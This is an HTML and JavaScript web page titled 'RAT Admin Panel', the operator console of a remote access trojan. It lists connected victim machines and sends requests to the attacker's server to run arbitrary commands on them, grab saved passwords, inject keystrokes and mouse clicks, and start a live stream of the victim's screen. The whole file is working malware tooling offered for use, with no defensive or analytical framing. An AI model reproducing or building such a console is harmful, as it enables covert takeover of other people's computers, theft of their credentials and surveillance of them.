<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Admin Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6200ee;
            --secondary: #03dac6;
            --bg: #121212;
            --card: #1e1e1e;
            --text: #e1e1e1;
        }
        body {
            font-family: 'Roboto', sans-serif;
            background: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 0;
        }
        .sidebar {
            width: 250px;
            background: var(--card);
            height: 100vh;
            position: fixed;
            overflow-y: auto;
        }
        .client-tab {
            padding: 15px;
            border-bottom: 1px solid #333;
            cursor: pointer;
            transition: 0.3s;
        }
        .client-tab:hover {
            background: #333;
        }
        .main {
            margin-left: 250px;
            padding: 20px;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        .tab-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        .tab-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
        }
        .tab-btn.active {
            background: var(--secondary);
        }
        .command-box, .stream-box, .control-box {
            background: var(--card);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        textarea, input {
            width: 100%;
            background: #333;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 10px;
        }
        button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            margin-right: 10px;
        }
        pre {
            background: #333;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="sidebar" id="sidebar">
        <h3 style="padding: 15px; margin: 0;">Connected Clients</h3>
        <div id="client-list"></div>
    </div>
    <div class="main">
        <h1>Admin Panel</h1>
        
        <!-- Tab Navigation -->
        <div class="tab-buttons">
            <button class="tab-btn active" onclick="openTab('commands')">Commands</button>
            <button class="tab-btn" onclick="openTab('passwords')">Passwords</button>
            <button class="tab-btn" onclick="openTab('remote')">Remote Control</button>
            <button class="tab-btn" onclick="openTab('stream')">Live Stream</button>
        </div>

        <!-- Commands Tab -->
        <div id="commands" class="tab-content active">
            <div class="command-box">
                <h3>Execute Command</h3>
                <textarea id="command-input" placeholder="Enter command..."></textarea>
                <button onclick="sendCommand()">Send</button>
                <pre id="command-output"></pre>
            </div>
        </div>

        <!-- Passwords Tab -->
        <div id="passwords" class="tab-content">
            <div class="command-box">
                <h3>Retrieve Saved Passwords</h3>
                <button onclick="getPasswords()">Grab Passwords</button>
                <pre id="passwords-output"></pre>
            </div>
        </div>

        <!-- Remote Control Tab -->
        <div id="remote" class="tab-content">
            <div class="control-box">
                <h3>Keyboard Control</h3>
                <input type="text" id="key-input" placeholder="Key to press (e.g., 'a', 'ctrl+c')">
                <button onclick="sendKey()">Send Key</button>
                
                <h3>Mouse Control</h3>
                <input type="text" id="mouse-pos" placeholder="X,Y coordinates (e.g., 100,200)">
                <button onclick="moveMouse()">Move Mouse</button>
                <button onclick="clickMouse('left')">Left Click</button>
                <button onclick="clickMouse('right')">Right Click</button>
            </div>
        </div>

        <!-- Live Stream Tab -->
        <div id="stream" class="tab-content">
            <div class="stream-box">
                <h3>Live Stream</h3>
                <button onclick="startStream()">Start Stream</button>
                <div id="stream-output"></div>
            </div>
        </div>
    </div>

    <script>
        // Tab management
        function openTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            document.getElementById(tabName).classList.add('active');
            event.currentTarget.classList.add('active');
        }

        // Client management
        let selectedClient = null;
        function updateClients() {
            fetch('/api/clients')
                .then(res => res.json())
                .then(data => {
                    const clientList = document.getElementById('client-list');
                    clientList.innerHTML = '';
                    data.clients.forEach(client => {
                        const tab = document.createElement('div');
                        tab.className = 'client-tab';
                        tab.textContent = client;
                        tab.onclick = () => {
                            selectedClient = client;
                            document.querySelectorAll('.client-tab').forEach(t => {
                                t.style.background = t.textContent === client ? '#6200ee' : '';
                            });
                        };
                        clientList.appendChild(tab);
                    });
                });
            setTimeout(updateClients, 2000);
        }

        // Command execution
        function sendCommand() {
            if (!selectedClient) return alert('Select a client first!');
            const command = document.getElementById('command-input').value;
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: selectedClient, command: command })
            }).then(res => res.json())
              .then(data => {
                  document.getElementById('command-output').textContent = data.status || data.error;
              });
        }

        // Password retrieval
        function getPasswords() {
            if (!selectedClient) return alert('Select a client first!');
            fetch('/api/get_passwords', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: selectedClient })
            }).then(res => res.json())
              .then(data => {
                  document.getElementById('passwords-output').textContent = 
                      data.passwords || data.error;
              });
        }

        // Remote control
        function sendKey() {
            if (!selectedClient) return alert('Select a client first!');
            const key = document.getElementById('key-input').value;
            fetch('/api/send_input', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    client_id: selectedClient,
                    action: 'keypress',
                    key: key
                })
            });
        }

        function moveMouse() {
            if (!selectedClient) return alert('Select a client first!');
            const pos = document.getElementById('mouse-pos').value;
            fetch('/api/send_input', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    client_id: selectedClient,
                    action: 'mouse_move',
                    key: pos
                })
            });
        }

        function clickMouse(button) {
            if (!selectedClient) return alert('Select a client first!');
            fetch('/api/send_input', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    client_id: selectedClient,
                    action: 'mouse_click',
                    key: button
                })
            });
        }

        // Initialize
        updateClients();
    </script>
</body>
</html>
